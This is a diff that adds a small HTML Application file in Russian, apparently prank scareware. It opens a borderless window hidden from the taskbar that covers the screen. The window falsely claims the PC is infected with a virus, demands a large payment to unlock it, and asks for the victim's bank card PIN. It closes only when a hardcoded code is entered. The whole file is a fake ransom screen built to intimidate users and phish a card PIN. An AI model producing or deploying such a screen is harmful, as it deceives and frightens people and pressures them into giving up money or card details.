@@ -1,0 +1,28 @@
+<html><head>
+  <meta charset="utf-8">
+  <title>VIRUS</title>
+<hta:application id=hta_id
+applicationName=hta_name
+showInTaskBar=no
+caption=no
+innerBorder=no
+selection=no
+scroll=no
+contextmenu=no
+border=dialog />
+<script language=javascript>
+var winWidth=2000; // ширина окна
+var winHeight=1500; // высота окна
+// изменяем размер
+window.resizeTo(winWidth, winHeight);
+
+// окно в центр экрана
+
+window.moveTo(0, 0);
+</script>
+</head>
+<body bgcolor="red" style="padding: 2px; font: 40px 'MS Sans serif'">
+<h1>ВАШ ПК БЫЛ ЗАРАЖЕН ВИРУСОМ :D</h1>
+<div style="border: dotted 5px blue; text-align: center;">Необходимо заплатить крупную сумму денег для разблокировки ПК.
+<br><br>ПИН-код вашей карты: <input type="password" id="inp" required>&nbsp;&nbsp;&nbsp;<button onclick="if(+inp.value == 3879) window.close();">OK</button></div>
+</body></html>
